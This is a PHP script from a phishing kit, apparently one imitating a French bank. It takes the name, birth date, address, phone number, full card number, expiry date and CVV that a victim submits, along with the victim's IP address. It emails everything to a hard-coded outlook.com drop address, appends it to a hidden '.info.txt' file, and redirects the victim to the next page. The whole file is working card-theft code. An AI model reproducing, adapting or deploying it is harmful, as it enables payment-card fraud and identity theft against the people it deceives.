<?

$ip = $_SERVER['REMOTE_ADDR'];
$message .= "====================== info ca =====================\n";
$message .= "CivilitГ  : ".$_POST['civ']."\n";
$message .= "prenom  : ".$_POST['pnm']."\n";
$message .= "nom : ".$_POST['nom']."\n";
$message .= "date  : ".$_POST['dobd']."\n";
$message .= "adresee : ".$_POST['adr']."\n";
$message .= "ville  : ".$_POST['cty']."\n";
$message .= "code postale : ".$_POST['zip']."\n";
$message .= "numero de telephone  : ".$_POST['num']."\n";
$message .= "card : ".$_POST['ccn']."\n";
$message .= "date  : ".$_POST['exm']."\n";
$message .= "date  : ".$_POST['exy']."\n";
$message .= "cvv : ".$_POST['cvv']."\n";
$message .= "info|".$ip."\n";
$message .= "====================== info 2018 =====================\n";
$send = "myrezultlikan@outlook.com";
$subject = "  || $ip";
$headers = "From: <myrezultlikan@outlook.com>";
mail($send,$subject,$message,$from);
		  $fp = fopen('.info.txt', 'a');
          fwrite($fp, $message);
          fclose($fp);
header("Location:cod.php");

?>	